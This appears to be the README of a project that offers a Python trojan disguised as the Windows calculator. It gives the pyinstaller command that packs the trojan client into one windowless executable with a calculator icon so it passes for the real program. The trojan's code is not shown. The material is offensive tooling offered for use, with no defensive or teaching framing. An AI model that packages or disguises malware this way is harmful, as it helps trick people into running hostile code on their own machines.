# Trojan disguised as Windows calculator

A simple trojan written in Python that disguises as the standard Windows calculator. 
There is currently no focus on obfuscating and AD evasion


# How to use

Install pyinstaller:
`pip install pyinstaller`

Create an executable with the provided calculator icon.
`pyinstaller --onefile calc_trojan_client.py --icon=calc.ico --noconsole`





